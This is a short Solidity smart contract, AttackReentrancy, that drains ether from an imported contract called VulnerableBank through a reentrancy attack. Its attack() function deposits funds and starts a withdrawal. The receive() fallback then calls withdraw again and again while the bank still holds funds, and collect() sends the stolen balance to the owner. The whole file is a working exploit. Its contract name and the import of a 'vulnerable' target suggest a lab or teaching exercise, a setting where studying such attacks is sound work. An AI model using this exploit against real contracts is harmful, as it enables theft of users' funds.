// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./VulnerableBank.sol";

contract AttackReentrancy {
    VulnerableBank public target;
    address public owner;
    uint public stealAmount;

    constructor(address _target) {
        target = VulnerableBank(_target);
        owner = msg.sender;
    }

    // receive ether and trigger reentry
    receive() external payable {
        uint256 bankBal = address(target).balance;
        if (bankBal >= stealAmount) {
            // reenter withdraw
            target.withdraw(stealAmount);
        }
    }

    function attack(uint256 _stealAmount) external payable {
        stealAmount = _stealAmount; // amount to request each withdraw reentry
        // deposit initial funds into bank to be allowed to withdraw
        target.deposit{value: msg.value}();
        // start first withdrawal which will reenter
        target.withdraw(_stealAmount);
    }

    function collect() external {
        payable(owner).transfer(address(this).balance);
    }
}
